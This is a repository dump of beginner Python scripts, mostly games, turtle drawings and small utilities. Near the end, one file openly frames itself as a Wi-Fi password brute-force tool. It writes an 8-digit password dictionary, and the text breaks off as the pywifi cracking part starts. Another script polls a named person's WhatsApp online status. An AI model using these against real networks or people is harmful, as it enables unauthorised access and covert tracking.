winner or a tie\ndef evaluate(board):\n    winner = 0\n\n    for player in [1, 2]:\n        if row_win(board, player) or col_win(board, player) or diag_win(board, player):\n\n            winner = player\n\n    if np.all(board != 0) and winner == 0:\n        winner = -1\n    return winner\n\n\n# Main function to start the game\ndef play_game():\n    board, winner, counter = create_board(), 0, 1\n    print(board)\n    sleep(2)\n\n    while winner == 0:\n        for player in [1, 2]:\n            board = random_place(board, player)\n            print(\"Board after \" + str(counter) + \" move\")\n            print(board)\n            sleep(2)\n            counter += 1\n            winner = evaluate(board)\n            if winner != 0:\n                break\n    return winner\n\n\n# Driver Code\nprint(\"Winner is: \" + str(play_game()))\n"
        },
        {
          "name": "tik_tak.py",
          "type": "blob",
          "size": 2.8603515625,
          "content": "# Tik-tak game\n\n\nboard = [\"anything\", 1, 2, 3, 4, 5, 6, 7, 8, 9]\nswitch = \"p1\"\nj = 9\nprint(\"\\n\\t\\t\\tTIK-TAC-TOE\")\n\n\ndef print_board():\n    # import os\n    # os.system('cls')\n    print(\"\\n\\n\")\n    print(\"    |     |\")\n    print(\"\", board[1], \" | \", board[2], \" | \", board[3])\n    print(\"____|_____|____\")\n    print(\"    |     |\")\n    print(\"\", board[4], \" | \", board[5], \" | \", board[6])\n    print(\"____|_____|____\")\n    print(\"    |     |\")\n    print(\"\", board[7], \" | \", board[8], \" | \", board[9])\n    print(\"    |     |\")\n\n\ndef enter_number(p1_sign, p2_sign):\n    global switch\n    global j\n    k = 9\n    while j:\n        if k == 0:\n            break\n\n        if switch == \"p1\":\n            p1_input = int(input(\"\\nplayer 1 :- \"))\n            if p1_input <= 0:\n                print(\"chose number from given board\")\n            else:\n                for e in range(1, 10):\n                    if board[e] == p1_input:\n                        board[e] = p1_sign\n                        print_board()\n                        c = checkwin()\n                        if c == 1:\n                            print(\"\\n\\n Congratulation ! player 1 win \")\n                            return\n\n                        switch = \"p2\"\n                        j -= 1\n                        k -= 1\n                        if k == 0:\n                            print(\"\\n\\nGame is over\")\n                            break\n\n        if k == 0:\n            break\n\n        if switch == \"p2\":\n            p2_input = int(input(\"\\nplayer 2 :- \"))\n            if p2_input <= 0:\n                print(\"chose number from given board\")\n                # return\n            else:\n                for e in range(1, 10):\n                    if board[e] == p2_input:\n                        board[e] = p2_sign\n                        print_board()\n                        w = checkwin()\n                        if w == 1:\n                            print(\"\\n\\n Congratulation ! player 2 win\")\n                            return\n\n                        switch = \"p1\"\n                        j -= 1\n                        k -= 1\n\n\ndef checkwin():\n    if board[1] == board[2] == board[3]:\n\n        return 1\n    elif board[4] == board[5] == board[6]:\n\n        return 1\n    elif board[7] == board[8] == board[9]:\n\n        return 1\n    elif board[1] == board[4] == board[7]:\n\n        return 1\n\n    elif board[2] == board[5] == board[8]:\n\n        return 1\n    elif board[3] == board[6] == board[9]:\n\n        return 1\n    elif board[1] == board[5] == board[9]:\n\n        return 1\n    elif board[3] == board[5] == board[7]:\n\n        return 1\n    else:\n        print(\"\\n\\nGame continue\")\n\n\ndef play():\n    print_board()\n    p1_sign = input(\"\\n\\nplayer 1 chose your sign [0/x] = \")\n    p2_sign = input(\"player 2 chose your sign [0/x] = \")\n    enter_number(p1_sign, p2_sign)\n    print(\"\\n\\n\\t\\t\\tDeveloped By :- UTKARSH MATHUR\")\n\n\nif __name__ == \"__main__\":\n    play()\n"
        },
        {
          "name": "time_delta.py",
          "type": "blob",
          "size": 1.44140625,
          "content": "\"\"\"Time Delta Solution \"\"\"\n\n\n# -----------------------------------------------------------------------------\n# You are givent two timestams in the format: Day dd Mon yyyy hh:mm:ss +xxxx\n# where +xxxx represents the timezone.\n\n# Input Format:\n# The first line contains T, the number of test cases.\n# Each test case contains two lines, representing the t1 and t2 timestamps.\n\n# Constraints:\n# input contains only valid timestamps.\n# year is  < 3000.\n\n# Output Format:\n# Print the absoulte diffrence (t2 - t1) in seconds.\n\n# Sample Input:\n# 2\n# Sun 10 May 2015 13:54:36 -0700\n# Sun 10 May 2015 13:54:36 -0000\n# Sat 02 May 2015 19:54:36 +0530\n# Fri 01 May 2015 13:54:36 -0000\n\n# Sample Output:\n# 25200\n# 88200\n#------------------------------------------------------------------------------\n\n# Imports\nimport math\nimport os \nimport random\nimport re\nimport sys\nimport datetime\n\n# Complete the time_delta function below.\ndef time_delta(t1, t2):\n    \"\"\"\n    Calculate the time delta between two timestamps in seconds.\n    \"\"\"\n    # Convert the timestamps to datetime objects\n    t1 = datetime.datetime.strptime(t1, '%a %d %b %Y %H:%M:%S %z')\n    t2 = datetime.datetime.strptime(t2, '%a %d %b %Y %H:%M:%S %z')\n\n    return (t1 - t2)\n\n\n\nif __name__ == '__main__':\n\n    t = int(input())\n\n    for itr_t in range(t):\n        t1 = input()\n\n        t2 = input()\n\n        delta = time_delta(t1, t2)\n        # print Delta with 1 Decimal Place\n        print(round(delta.total_seconds(), 1))\n\n\n\n\n"
        },
        {
          "name": "to check leap year",
          "type": "blob",
          "size": 0.4482421875,
          "content": "# Python program to check if year is a leap year or not\n\nyear = 2000\n\n# To get year (integer input) from the user\n# year = int(input(\"Enter a year: \"))\n\nif (year % 4) == 0:\n   if (year % 100) == 0:\n       if (year % 400) == 0:\n           print(\"{0} is a leap year\".format(year))\n       else:\n           print(\"{0} is not a leap year\".format(year))\n   else:\n       print(\"{0} is a leap year\".format(year))\nelse:\n   print(\"{0} is not a leap year\".format(year))\n"
        },
        {
          "name": "totaldigits.py",
          "type": "blob",
          "size": 0.15234375,
          "content": "# To Find The Total Number Of Digits In A Number\n\nN = int(input(\"Enter The number\"))  # To remove zeros before the number\ncount = len(str(N))\n\nprint(count)\n"
        },
        {
          "name": "translation_of_sizes_of_underwear_RU.py",
          "type": "blob",
          "size": 1.541015625,
          "content": "# coding: utf-8\ndef my_found(req):\n    my_dict = {\n        \"XXS\": [42, 36, 8, 38, 24],\n        \"XS\": (2),\n        \"S\": (4),\n        \"M\": (6),\n        \"L\": (8),\n        \"XL\": (10),\n        \"XXL\": (12),\n        \"XXXL\": (14),\n    }\n    if req[0] != \"XXS\":\n        answ = my_dict[\"XXS\"][req[1] - 1] + my_dict[req[0]]\n    else:\n        answ = my_dict[\"XXS\"][req[1] - 1]\n    return answ\n\n\ncountry = {1: \"Россия\", 2: \"Германия\", 3: \"США\", 4: \"Франция\", 5: \"Великобритания\"}\n\nprint(\n    \"Программа перевода размеров женского белья из\\n\"\n    \"международной системы в системы следующих стран:\\n\"\n    \"1 - Россия, 2 - Германия, 3 - США, 4 - Франция, 5 - Великобритания.\\n\"\n    \"Справка (международная система): XXS, XS, S, M, L, XL, XXL, XXXL\"\n)\n\nreq = []\nwhile len(req) <= 1:\n    req = list(\n        input(\n            \">>> Введите через пробел международный размер и страну,\\n\"\n            \"в систему которой перевести данный размер: \"\n        ).split()\n    )\n    req[0] = req[0].upper()\n    if len(req) <= 1:\n        print(\"Вы таки что-то сделали не так... \\nНужно повторить попытку!\")\n    else:\n        req[1] = int(req[1])\n\nprint(\n    f'Выбранный Вами размер \"{req[0]}\" в системе размеров \"{country[req[1]]}\" будет: {my_found(req)}'\n)\n"
        },
        {
          "name": "triangles.py",
          "type": "blob",
          "size": 0.4052734375,
          "content": "max_size = 10\n\nprint(\n    \"(a)\"\n    + \" \" * (max_size)\n    + \"(b)\"\n    + \" \" * (max_size)\n    + \"(c)\"\n    + \" \" * (max_size)\n    + \"(d)\"\n    + \" \" * (max_size)\n)\n\nfor i in range(1, max_size + 1):\n\n    print(\"*\" * i, end=\" \" * (max_size - i + 3))\n\n    print(\"*\" * (max_size - i + 1), end=\" \" * (i - 1 + 3))\n\n    print(\" \" * (i - 1) + \"*\" * (max_size - i + 1), end=\" \" * 3)\n\n    print(\" \" * (max_size - i) + \"*\" * i)\n"
        },
        {
          "name": "tuple.py",
          "type": "blob",
          "size": 0.33203125,
          "content": "a=(1,2,3,4,5)\nprint('Individual elements of Tuple are')\nfor i in a:\n    print(i,end='  ')\nprint()\nprint('Value at index number 3 is:',a[3])\nprint('Values from index no 2 are',a[2:])\nprint('Length of tuple is',len(a))\nprint('Maximum value from tuple is ',max(a))\nprint('Minimum value from tuple is ',min(a))\ndel a    #delete the whole tuple\n"
        },
        {
          "name": "turtal game.ipynb",
          "type": "blob",
          "size": 3.4365234375,
          "content": "{\n \"cells\": [\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 1,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"import turtle \\n\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 2,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"s = turtle.getscreen()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 3,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"t = turtle.Turtle()\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 11,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"['DEFAULT_ANGLEOFFSET', 'DEFAULT_ANGLEORIENT', 'DEFAULT_MODE', 'START_ORIENTATION', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_angleOffset', '_angleOrient', '_cc', '_clear', '_clearstamp', '_color', '_colorstr', '_creatingPoly', '_degreesPerAU', '_delay', '_drawing', '_drawturtle', '_fillcolor', '_fillitem', '_fillpath', '_fullcircle', '_getshapepoly', '_go', '_goto', '_hidden_from_screen', '_mode', '_newLine', '_orient', '_outlinewidth', '_pen', '_pencolor', '_pensize', '_poly', '_polytrafo', '_position', '_reset', '_resizemode', '_rotate', '_screen', '_setDegreesPerAU', '_setmode', '_shapetrafo', '_shearfactor', '_shown', '_speed', '_stretchfactor', '_tilt', '_tracer', '_undo', '_undobuffersize', '_undogoto', '_update', '_update_data', '_write', 'back', 'backward', 'begin_fill', 'begin_poly', 'bk', 'circle', 'clear', 'clearstamp', 'clearstamps', 'clone', 'color', 'currentLine', 'currentLineItem', 'degrees', 'distance', 'dot', 'down', 'drawingLineItem', 'end_fill', 'end_poly', 'fd', 'fillcolor', 'filling', 'forward', 'get_poly', 'get_shapepoly', 'getpen', 'getscreen', 'getturtle', 'goto', 'heading', 'hideturtle', 'home', 'ht', 'isdown', 'isvisible', 'items', 'left', 'lt', 'onclick', 'ondrag', 'onrelease', 'pd', 'pen', 'pencolor', 'pendown', 'pensize', 'penup', 'pos', 'position', 'pu', 'radians', 'reset', 'resizemode', 'right', 'rt', 'screen', 'screens', 'seth', 'setheading', 'setpos', 'setposition', 'settiltangle', 'setundobuffer', 'setx', 'sety', 'shape', 'shapesize', 'shapetransform', 'shearfactor', 'showturtle', 'speed', 'st', 'stamp', 'stampItems', 'tilt', 'tiltangle', 'towards', 'turtle', 'turtlesize', 'undo', 'undobuffer', 'undobufferentries', 'up', 'width', 'write', 'xcor', 'ycor']\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"print(dir(t))\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 13,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"t.dot(100)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 15,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"turtle.bgcolor(\\\"purple\\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": []\n  }\n ],\n \"metadata\": {\n  \"kernelspec\": {\n   \"display_name\": \"Python 3\",\n   \"language\": \"python\",\n   \"name\": \"python3\"\n  },\n  \"language_info\": {\n   \"codemirror_mode\": {\n    \"name\": \"ipython\",\n    \"version\": 3\n   },\n   \"file_extension\": \".py\",\n   \"mimetype\": \"text/x-python\",\n   \"name\": \"python\",\n   \"nbconvert_exporter\": \"python\",\n   \"pygments_lexer\": \"ipython3\",\n   \"version\": \"3.8.5\"\n  }\n },\n \"nbformat\": 4,\n \"nbformat_minor\": 4\n}\n"
        },
        {
          "name": "turtle module",
          "type": "blob",
          "size": 3.9599609375,
          "content": "<h2> Turtle Module </h2>\n\n**Turtle Graphics**\n\n```\nimport turtle\nscrn = turtle.Screen()                  #creates a graphics window\nsponge = turtle.Turtle()                #creates a turtle whose name is sponge\nsponge.forward(200)                     #object.method(parameter)\nsponge.left(90)\nsponge.forward(100)\nsponge.right(90)\nsponge.forward(100)\nsponge.left(90)\nsponge.backward(30)\n```\n\n```\n#import turtle defines the module turtle which will allow you to create a Turtle object and draw with it.\n#turtle.Turtle; here \"turtle\" tells Python that we are referring to the turtle module, which is where the object \"Turtle\" is found\n``` \n\n**Creating a Rectangle**\n\n```\nimport turtle                   #here loads a module named turtle\n                                #This module brings two new types: the Turtle type, and the Screen type.\nscrn = turtle.Screen()          #creates a graphics window\n                                #scrn is an instance of Screen class\nciri = turtle.Turtle()          #means the Turtle type that is defined within the turtle module\n                                #ciri is an instance of Turtle class\nciri.forward(180)               #object.method(parameter)\nciri.left(90)             \nciri.forward(75)         \nciri.left(90)\nciri.forward(180)\nciri.left(90)\nciri.forward(75)\n```\n**Creating  a triangle**\n\n```\nimport turtle                  \nscrn = turtle.Screen()         \nmini = turtle.Turtle()\nmini.forward(180)\nmini.left(150)\nmini.forward(100)      #object.method(parameter)\nmini.left(60)\nmini.forward(100)\n```\n**Creating rectangle and triangle together**\n\n```\nimport turtle                  \nscrn = turtle.Screen()         \nciri = turtle.Turtle()         \nciri.forward(180)           #object.method(parameter)\nciri.left(90)             \nciri.forward(75)         \nciri.left(90)\nciri.forward(180)\nciri.left(90)\nciri.forward(75)\n\nmini = turtle.Turtle()\nmini.forward(180)\nmini.left(150)\nmini.forward(100)      #object.method(parameter)\nmini.left(60)\nmini.forward(100)\n```\n\n**Using properties**\n\n```\nimport turtle \nscrn = turtle.Screen()\nscrn.bgcolor(\"lavender\")\n#the object scrn has color property(which we write as bgcolor)\narin = turtle.Turtle()\narin.color(\"blue\")\narin.pensize(3)\n#the object arin has property/attribute - color,pensize\narin.forward(100)\narin.right(90)                    #name.right(90) goes downward\narin.forward(90)\n\narina = turtle.Turtle()\narina.color(\"hot pink\")\narin.pensize(4)\narina.forward(100)\narina.left(90)                    #name.left(90) goes upward\narina.forward(90)\n\n#name.right(value)/name.left(value) works for defining angles(degrees).\n```\n**Mutliple objects with properties**\n\n```\nimport turtle \nscrn = turtle.Screen()\nscrn.bgcolor(\"lavender\")\n#the object scrn has color property(which we write as bgcolor)\narin = turtle.Turtle()\narin.color(\"blue\")\narin.pensize(3)\n#the object arin has property/attribute - color,pensize\narin.forward(100)\narin.right(90)                    #name.right(90) goes downward\narin.forward(90)\n\narina = turtle.Turtle()\narina.color(\"hot pink\")\narin.pensize(4)\narina.forward(100)\narina.left(90)                    #name.left(90) goes upward\narina.forward(90)\n\n#name.right(value)/name.left(value) works for defining angles(degrees).\nciri = turtle.Turtle()\nciri.color(\"yellow\")\nciri.forward(180)           #object.method(parameter)\nciri.left(90)             \nciri.forward(75)         \nciri.left(90)\nciri.forward(180)\nciri.left(90)\nciri.forward(75)\n\nmini = turtle.Turtle()\nmini.forward(180)\nmini.left(150)\nmini.forward(100)      #object.method(parameter)\nmini.left(60)\nmini.forward(100)\n\nprity = turtle.Turtle()\nprity.color(\"green\")\narin.pensize(2)\nprity.right(45)\nprity.forward(60)\nprity.left(90)\nprity.forward(100)\n\nzina = turtle.Turtle()\nzina.color(\"red\")\nzina.pensize(3)\nzina.left(180)                   #notice this\nzina.forward(150)\n\nscrn.exitonclick()                # wait for a user click on the canvas\n#we invoke its exitonclick method of scrn object, the program pauses execution \n#and waits for the user to click the mouse somewhere in the window\n\n```\n"
        },
        {
          "name": "turtle_shapes_made.py",
          "type": "blob",
          "size": 1.2353515625,
          "content": "import turtle\n\nclass ShapeDrawer:\n    def __init__(self, color, pensize):\n        self.turtle = turtle.Turtle()\n        self.turtle.color(color)\n        self.turtle.pensize(pensize)\n\n    def draw_rectangle(self, width, height):\n        for _ in range(2):\n            self.turtle.forward(width)\n            self.turtle.left(90)\n            self.turtle.forward(height)\n            self.turtle.left(90)\n\n    def draw_triangle(self, length):\n        for _ in range(3):\n            self.turtle.forward(length)\n            self.turtle.left(120)\n\ndef main():\n    scrn = turtle.Screen()\n    scrn.bgcolor(\"lavender\")\n\n    # Draw Rectangle\n    rectangle_drawer = ShapeDrawer(\"blue\", 3)\n    rectangle_drawer.draw_rectangle(180, 75)\n\n    # Draw Triangle\n    triangle_drawer = ShapeDrawer(\"hot pink\", 4)\n    triangle_drawer.turtle.penup()\n    triangle_drawer.turtle.goto(-90, -75)\n    triangle_drawer.turtle.pendown()\n    triangle_drawer.draw_triangle(100)\n\n    # Add more drawings as needed\n    # ...\n\n    # Example: Draw a circle\n    circle_drawer = ShapeDrawer(\"green\", 2)\n    circle_drawer.turtle.penup()\n    circle_drawer.turtle.goto(0, 0)\n    circle_drawer.turtle.pendown()\n    circle_drawer.turtle.circle(50)\n\n    scrn.exitonclick()\n\nif __name__ == \"__main__\":\n    main()"
        },
        {
          "name": "tweeter.py",
          "type": "blob",
          "size": 1.8544921875,
          "content": "from __future__ import print_function\nimport os\nimport tweepy\n\n# TODO: Further improvements can be made to the program\n# TODO: Further feature improvements and Refactoring can be done to the program\n# TODO: Add a README.md file showcasing how adding it to the PATH variable can make the posting much easier\n\n\ndef get_status():\n    lines = []\n    while True:\n        line = input()\n        if line:\n            lines.append(line)\n        else:\n            break\n    return \"\\n\".join(lines)\n\n\ndef tweet_text(api, user):\n    print(f\"Enter your tweet, {user.name}:\")\n    tweet = get_status()\n    try:\n        api.update_status(tweet)\n        print(\"\\nTweet posted successfully!\")\n    except tweepy.TweepError as e:\n        print(f\"Error posting tweet: {e}\")\n\n\ndef tweet_picture(api, user):\n    print(f\"Enter the picture path, {user.name}:\")\n    pic = os.path.abspath(input())\n    print(f\"Enter the status, {user.name}:\")\n    title = get_status()\n    try:\n        api.update_with_media(pic, status=title)\n        print(\"\\nTweet with picture posted successfully!\")\n    except tweepy.TweepError as e:\n        print(f\"Error posting tweet with picture: {e}\")\n\n\ndef initialize_api():\n    ck = \"your_consumer_key\"\n    cks = \"your_consumer_key_secret\"\n    at = \"your_access_token\"\n    ats = \"your_access_token_secret\"\n\n    auth = tweepy.OAuthHandler(ck, cks)\n    auth.set_access_token(at, ats)\n    api = tweepy.API(auth)\n    user = api.me()\n    return api, user\n\n\ndef main():\n    try:\n        doit = int(input(\"\\n1. Text\\n2. Picture\\nChoose option (1/2): \"))\n        api, user = initialize_api()\n\n        if doit == 1:\n            tweet_text(api, user)\n        elif doit == 2:\n            tweet_picture(api, user)\n        else:\n            print(\"Invalid option. Please choose 1 or 2.\")\n    except ValueError:\n        print(\"Invalid input. Please enter a valid number.\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "twitter_post_scraper.py",
          "type": "blob",
          "size": 1.2802734375,
          "content": "import requests\nfrom bs4 import BeautifulSoup\nimport re\n\nre_text = r\"\\:|\\.|\\!|(https|http)?:\\/\\/(\\w|\\.|\\/|\\?|\\=|\\&|\\%)*\\b|(.twitter.com\\/)\\w*|\\&\"\nre_text_1 = r\"(pictwittercom)\\/\\w*\"\n\n\ndef tweeter_scrapper():\n    list_of_dirty_tweets = []\n    clear_list_of_tweets = []\n    base_tweeter_url = \"https://twitter.com/{}\"\n\n    tweeter_id = input()\n\n    response = requests.get(base_tweeter_url.format(tweeter_id))\n    soup = BeautifulSoup(response.content, \"lxml\")\n    all_tweets = soup.find_all(\"div\", {\"class\": \"tweet\"})\n\n    for tweet in all_tweets:\n        content = tweet.find(\"div\", {\"class\": \"content\"})\n        message = (\n            content.find(\"div\", {\"class\": \"js-tweet-text-container\"})\n            .text.replace(\"\\n\", \" \")\n            .strip()\n        )\n        list_of_dirty_tweets.append(message)\n    for dirty_tweet in list_of_dirty_tweets:\n        dirty_tweet = re.sub(re_text, \"\", dirty_tweet, flags=re.MULTILINE)\n        dirty_tweet = re.sub(re_text_1, \"\", dirty_tweet, flags=re.MULTILINE)\n        dirty_tweet = dirty_tweet.replace(u\"\\xa0…\", u\"\")\n        dirty_tweet = dirty_tweet.replace(u\"\\xa0\", u\"\")\n        dirty_tweet = dirty_tweet.replace(u\"\\u200c\", u\"\")\n        clear_list_of_tweets.append(dirty_tweet)\n    print(clear_list_of_tweets)\n\n\nif __name__ == \"__main__\":\n    tweeter_scrapper()\n"
        },
        {
          "name": "two_num.py",
          "type": "blob",
          "size": 0.6748046875,
          "content": "\"\"\"Author Anurag Kumar (mailto:anuragkumarak95@gmail.com)\n\nGiven an array of integers, return indices of the two numbers\nsuch that they add up to a specific target.\nYou may assume that each input would have exactly one solution,\nand you may not use the same element twice.\n\nExample:\nGiven nums = [2, 7, 11, 15], target = 9,\nBecause nums[0] + nums[1] = 2 + 7 = 9,\nreturn [0, 1].\n\n\"\"\"\n\n\ndef twoSum(nums, target):\n    chk_map = {}\n    for index, val in enumerate(nums):\n        compl = target - val\n        if compl in chk_map:\n            indices = [chk_map[compl], index]\n            print(indices)\n            return [indices]\n        else:\n            chk_map[val] = index\n    return False\n"
        },
        {
          "name": "ultimate-phone-book",
          "type": "tree",
          "content": null
        },
        {
          "name": "url_shortner.py",
          "type": "blob",
          "size": 0.3515625,
          "content": "# Importing the required libraries.\nimport pyshorteners\n\n# Taking input from the user.\nurl = input(\"Enter URL: \")\n\n# Creating an instance of the pyshorteners library.\nshortener = pyshorteners.Shortener()\n\n# Shortening the URL using TinyURL.\nshortened_URL = shortener.tinyurl.short(url)\n\n# Displaying the shortened URL.\nprint(f\"Shortened URL: {shortened_URL}\")\n"
        },
        {
          "name": "very_easy",
          "type": "tree",
          "content": null
        },
        {
          "name": "video-operations",
          "type": "tree",
          "content": null
        },
        {
          "name": "videodownloder.py",
          "type": "blob",
          "size": 0.537109375,
          "content": "from pytube import YouTube \n\n#location where you save.\nPATH = \"E:/\" #to_do \n\n#link of video.\nlink=[\"https://www.youtube.com/watch?v=p8FuTenSWPI\", \n\t\"https://www.youtube.com/watch?v=JWbnEt3xuos\"\n\t]#list of video links. \nfor i in link: \n\ttry: \n\t\tyt = YouTube(i) \n\texcept: \n\t\tprint(\"Connection Error\") #to handle exception \n\t\n\t#check files with \"mp4\" extension \n\tmp4files = yt.filter('mp4') \n\n\td_video = yt.get(mp4files[-1].extension,mp4files[-1].resolution) \n\ttry: \n\t\td_video.download(PATH) \n\texcept: \n\t\tprint(\"Some Error!\") \nprint('Task Completed!') \n"
        },
        {
          "name": "vigenere_cipher.py",
          "type": "blob",
          "size": 1.0439453125,
          "content": "text = \"mrttaqrhknsw ih puggrur\"\ncustom_key = \"happycoding\"\n\n\ndef vigenere(message, key, direction=1):\n    key_index = 0\n    alphabet = \"abcdefghijklmnopqrstuvwxyz\"\n    final_message = \"\"\n\n    for char in message.lower():\n        # Append any non-letter character to the message\n        if not char.isalpha():\n            final_message += char\n        else:\n            # Find the right key character to encode/decode\n            key_char = key[key_index % len(key)]\n            key_index += 1\n\n            # Define the offset and the encrypted/decrypted letter\n            offset = alphabet.index(key_char)\n            index = alphabet.find(char)\n            new_index = (index + offset * direction) % len(alphabet)\n            final_message += alphabet[new_index]\n\n    return final_message\n\n\ndef encrypt(message, key):\n    return vigenere(message, key)\n\n\ndef decrypt(message, key):\n    return vigenere(message, key, -1)\n\n\nprint(f\"\\nEncrypted text: {text}\")\nprint(f\"Key: {custom_key}\")\ndecryption = decrypt(text, custom_key)\nprint(f\"\\nDecrypted text: {decryption}\\n\")\n"
        },
        {
          "name": "vowel remover function.py",
          "type": "blob",
          "size": 0.171875,
          "content": "def vowel_remover(text):\n    string = \"\"\n    for l in text:\n        if l.lower() not in \"aeiou\":\n            string += l\n    return string\nprint(vowel_remover(\"hello world!\"))\n"
        },
        {
          "name": "webcam.py",
          "type": "blob",
          "size": 1.138671875,
          "content": "# Requirements:\n#     pip install numpy\n#     pip install opencv-python\n# Program:\n#     Opens your webcam and records.\n\n# Improve this program and make it suitable for general module like use in another programs\nimport cv2\n\ncap = cv2.VideoCapture(0)\n\n# Obtain resolutions, convert resolutions from float to integer\nframes_width = int(cap.get(3))\nframes_height = int(cap.get(4))\n\n# Specify the video codec\n# FourCC is platform dependent; however, MJPG is a safe choice.\nfourcc = cv2.VideoWriter_fourcc(*\"MJPG\")\n\n# Create video writer object. Save file to recording.avi\nout = cv2.VideoWriter(\"recording.avi\", fourcc, 20.0, (frames_width, frames_height))\n\nwhile True:\n    # Capture frame-by-frame\n    ret, frame = cap.read()\n\n    if ret == True:\n        # Write frame to recording.avi\n        out.write(frame)\n\n        # Our operations on the frame come here\n        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n        # Display the resulting frame\n        cv2.imshow(\"frame\", gray)\n        if cv2.waitKey(1) & 0xFF == ord(\"q\"):\n            break\n\n# When everything is done, release the capture and video writer\ncap.release()\nout.release()\ncv2.destroyAllWindows()\n"
        },
        {
          "name": "whatsapp-monitor.py",
          "type": "blob",
          "size": 1.4970703125,
          "content": "#! /usr/bin/python3\n\n\"\"\"\nAuthor- Tony Stark \n\ndownload https://github.com/mozilla/geckodriver/releases\n\nset path paste binary file /usr/local/bin \n\ninstall requirements: python -m pip install selenium\n\n\"\"\"\n\nfrom selenium import webdriver\nimport os\nimport time\n\ndriver = webdriver.Firefox()\ndriver.get(\"http://web.whatsapp.com\")\nname = input(\"Please Enter Name for search online status: \")\n\nwhile True:\n\n    try:\n        chat = driver.find_element_by_xpath(\n            \"/html/body/div[1]/div/div/div[3]/div/header/div[2]/div/span/div[2]/div\"\n        )\n        chat.click()\n        time.sleep(2)\n        search = driver.find_element_by_xpath(\n            \"/html/body/div[1]/div/div/div[2]/div[1]/span/div/span/div/div[1]/div/label/input\"\n        )\n        search.click()\n        time.sleep(2)\n        search.send_keys(name)\n        time.sleep(2)\n        open = driver.find_element_by_xpath(\n            \"/html/body/div[1]/div/div/div[2]/div[1]/span/div/span/div/div[2]/div[1]/div/div/div[2]/div/div\"\n        )\n        open.click()\n        time.sleep(2)\n\n        while True:\n            try:\n                status = driver.find_element_by_class_name(\"_315-i\").text\n                name = driver.find_element_by_class_name(\"_19vo_\").text\n                print(\"{0} is {1}\".format(name, status))\n                time.sleep(30)\n            except:\n                name = driver.find_element_by_class_name(\"_19vo_\").text\n                print(\"{0} is {1}\".format(name, \"offline\"))\n                time.sleep(30)\n\n    except:\n        pass\n"
        },
        {
          "name": "whatsapp-schedule.py",
          "type": "blob",
          "size": 1.26171875,
          "content": "\"\"\"\r\nAuthor- Richmond Nyamekye \r\n\r\ndownload https://github.com/mozilla/geckodriver/releases\r\n\r\ninstall requirements: python -m pip install selenium\r\n\r\n\"\"\"\r\nimport pywhatkit\r\n\r\n\r\ndef send_msg(phone: str, msg: str, hour: int, minute: int) -> None:\r\n    pywhatkit.sendwhatmsg(phone, msg, hour, minute)\r\n\r\n\r\ndef send_whatmsg_to_group(group: str, msg: str, hour: int, minute: int) -> None:\r\n    pywhatkit.send_whatmsg_to_group(group, msg, hour, minute)\r\n\r\n\r\ndef main():\r\n    msg_type = int(input(\"Enter 1 to send a message to a uSER and 2 to a GROUP: \"))\r\n    if msg_type == 1:\r\n        phone = input(\"Enter phone number: \")\r\n        if phone[0] == \"0\":\r\n            phone = phone[1::]\r\n        while True:\r\n            if len(phone) < 9:\r\n                raise ValueError(\"Invalid phone number: \")\r\n            else:\r\n                break\r\n        phone = f\"+233{phone}\"\r\n    elif msg_type == 2:\r\n        group = input(\"Enter group to send message: \")\r\n    msg = str(input(\"Enter message: \"))\r\n    hour = int(input(\"Enter the time in hour: \"))\r\n    minute = int(input(\"Enter the time in minute: \"))\r\n\r\n    if msg_type == 1:\r\n        send_msg(phone, msg, hour, minute)\r\n    elif msg_type == 2:\r\n        send_whatmsg_to_group(group, msg, hour, minute)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n"
        },
        {
          "name": "wifi hack by brutefore.py",
          "type": "blob",
          "size": 4.39453125,
          "content": "\"\"\"\nIntroduction Description\n\nThe machine operating environment: system environment Win10, the operating environment Python3.6, run the tool Pycharm\n\nPython packages need to have: pywifi\n\nThis is a brute wifi mode, the time required is longer, this paper provides a break ideas\n\nSecond, the idea of introduction\n\nMr. into a password dictionary (This step can also be downloaded from the Internet dictionary)\n\nCycle with each password password dictionary to try to connect Wifi, until success\n\nThird, source design\n\n1. password dictionary TXT file is generated, provided herein is relatively simple, practical crack passwords can be set according to the general, to generate relatively large relatively wide password dictionary\n\nThe following provides a simple 8 purely digital dictionary generation program codes\n\"\"\"\n\n\n\n\nimport itertools as its\n\n# Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!\n\nif __name__ == '__main__':\n    words_num = \"1234567890\"\n    words_letter = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n    r = its.product(words_num, repeat=8)\n    dic = open ( \"password-8 digits .txt\", \"w\")\n    for i in r:\n        dic.write(\"\".join(i))\n        dic.write(\"\".join(\"\\n\"))\n    dic.close()\n    \n    \n    \n    \n    \n    \n  #  2. brute force password when using longer\n  \n  \nimport pywifi\n \nfrom pywifi import const # quote some definitions\n \nimport time\n'''\n Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been 